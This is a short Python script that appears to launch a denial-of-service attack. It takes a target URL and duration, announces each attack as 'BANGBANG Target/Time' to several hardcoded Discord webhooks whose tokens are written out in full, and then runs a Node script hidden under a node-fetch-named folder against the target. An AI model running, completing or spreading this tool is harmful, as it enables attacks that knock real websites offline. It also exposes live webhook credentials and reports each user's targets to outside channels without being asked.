import os
import sys
import requests
import json

def sendsocket(socket_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(socket_url, data=json.dumps(data), headers=headers)

socket_url1 = "https://discord.com/api/webhooks/1122603077183230042/GDvGVaPQ-UC45c94aeGAvrK5LcHIJ_ylqMNuxDsINpyPhF_bUMAjGLWZSsEM9_1UbqLM"
socket_url2 = "https://discord.com/api/webhooks/884608550318510130/J3300nWWYFWMnNwlwZ9S60dI7i_jlJT5RsF3PAXWGINQl9s8h24wRKa0CNBrpX1QdjsL"
socket_url3 = "https://discord.com/api/webhooks/1122603077183230042/GDvGVaPQ-UC45c94aeGAvrK5LcHIJ_ylqMNuxDsINpyPhF_bUMAjGLWZSsEM9_1UbqLM"
socket_url4 = "https://discord.com/api/webhooks/884608550318510130/J3300nWWYFWMnNwlwZ9S60dI7i_jlJT5RsF3PAXWGINQl9s8h24wRKa0CNBrpX1QdjsL"
socket_url5 = "https://discord.com/api/webhooks/1158332824563220510/7YdB_i1SJGSXH9kWjQUDdP6RhfwzB1cMTXM4Lmwh2VeE9SGxlO6EKZn4v8iglOaeT7FT"
socket_url6 = "https://discord.com/api/webhooks/1158333924729176165/vADtaBiBF8Q3pFoc6Zb7xJtjrUdzx41Cv-y-UoDbvW1EjMltLr1wSkCW3521vh-TV9FI"
socket_url6 = "https://discord.com/api/webhooks/1158334724457103471/ZTl3Gp256d3sXdU4ZLPM0v8woixgqpCBCC-5zZrtO45GUXZKskyQ2MwYCVlU3t6QpAED"

if len(sys.argv) < 3:
    print('Usage: python script.py <URL> <TIME>')
    sys.exit(1)

url = sys.argv[1]
time = sys.argv[2]

print("\n")

if url.strip() and time.strip():
    sendsocket(socket_url1, f"\n\n---------------\nBANGBANG\n---------------\nTarget: {url}\nTime: {time}\n---------------\nBANGBANG\n---------------\n‎ \n‎ \n‎ ")
    sendsocket(socket_url2, f"\n\n---------------\nBANGBANG\n---------------\nTarget: {url}\nTime: {time}\n---------------\nBANGBANG\n---------------\n‎ \n‎ \n‎ ")
    sendsocket(socket_url3, f"\n\n---------------\nBANGBANG\n---------------\nTarget: {url}\nTime: {time}\n---------------\nBANGBANG\n---------------\n‎ \n‎ \n‎ ")
    sendsocket(socket_url4, f"\n\n---------------\nBANGBANG\n---------------\nTarget: {url}\nTime: {time}\n---------------\nBANGBANG\n---------------\n‎ \n‎ \n‎ ")
    gb = os.path.join("node-fetch/lib", "mix.js")
    os.system(f'node {gb} {url} {time}')
else:
    print("Input tidak boleh kosong !")
